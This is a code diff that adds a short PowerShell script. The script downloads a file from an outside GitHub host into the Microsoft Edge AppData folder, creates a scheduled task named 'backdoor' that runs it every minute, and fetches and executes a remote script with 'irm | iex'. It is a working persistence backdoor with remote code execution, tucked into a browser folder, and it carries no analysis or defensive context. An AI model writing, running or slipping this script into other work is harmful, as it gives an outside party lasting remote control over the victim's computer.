@@ -1,0 +1,9 @@
+$edgeDirectory = Join-Path -Path $env:APPDATA -ChildPath '..\Local\Microsoft\Edge'
+
+$scriptPath = Join-Path -Path $edgeDirectory -ChildPath 'script'
+
+Invoke-WebRequest -Uri 'https://wolfoverflow.github.io/winscript' -OutFile (Join-Path -Path $edgeDirectory -ChildPath 'script')
+
+schtasks /CREATE /SC MINUTE /TN "backdoor" /TR $scriptPath
+
+irm https://raw.githubusercontent.com/Wolfoverflow/backdoor/main/winscript | iex
